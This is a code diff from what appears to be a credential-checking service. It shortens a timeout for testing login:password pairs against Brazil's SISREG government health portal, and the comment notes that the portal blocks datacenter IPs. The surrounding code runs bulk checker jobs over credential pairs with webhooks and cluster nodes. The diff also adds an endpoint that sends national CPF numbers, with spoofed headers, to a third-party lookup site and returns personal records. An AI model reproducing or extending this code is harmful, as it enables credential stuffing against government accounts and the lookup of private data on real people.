@@ -516,7 +516,7 @@ async function checkSerpro(login: string, password: string): Promise<CheckResult
 //  Logic: POST SHA-256 hashed password → parse HTML for profile markers
 // ═══════════════════════════════════════════════════════════════════════════════
 const SISREG_URL     = "https://sisregiii.saude.gov.br/";
-const SISREG_TIMEOUT = 20_000;
+const SISREG_TIMEOUT = 8_000; // sisregiii.saude.gov.br blocks datacenter IPs → fail fast
 
 async function checkSisreg(login: string, password: string): Promise<CheckResult> {
   const credential  = `${login}:${password}`;
@@ -5471,6 +5471,39 @@ router.post("/checker/stream", (req, res): void => {
 
   void runCheckerJobAsync(job, pairs, webhookUrl, clusterNodes);
   sseSubscribe(job, res);
+});
+
+// ── CPF Lookup — GET /api/cpf/:cpf ─────────────────────────────────────────
+// Proxies to usuarioconsulta.store (Lyzed Consulta) and returns structured JSON.
+// CPF must be exactly 11 digits (cleaned — dots and dash stripped).
+router.get("/cpf/:cpf", async (req, res): Promise<void> => {
+  const raw = (req.params.cpf ?? "").replace(/\D/g, "");
+  if (raw.length !== 11) {
+    res.status(400).json({ error: "CPF deve ter 11 dígitos" }); return;
+  }
+
+  try {
+    const result = await runCurl([
+      "-s", "--compressed", "--max-time", "12",
+      "-H", "Accept: application/json",
+      "-H", `Referer: https://lyzedconsulta.netlify.app/`,
+      "-H", `User-Agent: ${DESKTOP_UA}`,
+      `https://usuarioconsulta.store/proxy.php?cpf=${raw}`,
+    ], 14_000);
+
+    if (!result.body || result.statusCode === 0) {
+      res.status(502).json({ error: "API indisponível" }); return;
+    }
+
+    let json: Record<string, unknown>;
+    try { json = JSON.parse(result.body); } catch {
+      res.status(502).json({ error: "Resposta inválida da API" }); return;
+    }
+
+    res.json(json);
+  } catch (e) {
+    res.status(500).json({ error: String(e) });
+  }
 });
 
 export default router;
